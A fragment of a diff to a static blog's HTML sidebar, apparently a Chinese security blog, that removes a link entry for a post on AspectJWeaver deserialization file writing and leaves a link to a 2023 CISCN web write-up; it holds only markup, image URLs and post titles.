           </div>
         
@@ -1049,27 +1067,6 @@
                 
               </div>
               <a class="post-title" href="/2024/12/09/2023ciscn-fu-xian/">2023CISCN 初赛WEB WP</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2024/12/09/aspectjweaver-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8123.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8123.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">12-09</span>
-                
-              </div>
-              <a class="post-title" href="/2024/12/09/aspectjweaver-fan-xu-lie-hua/">AspectJWeaver反序列化写文件</a>
             </div>
           </div>
         
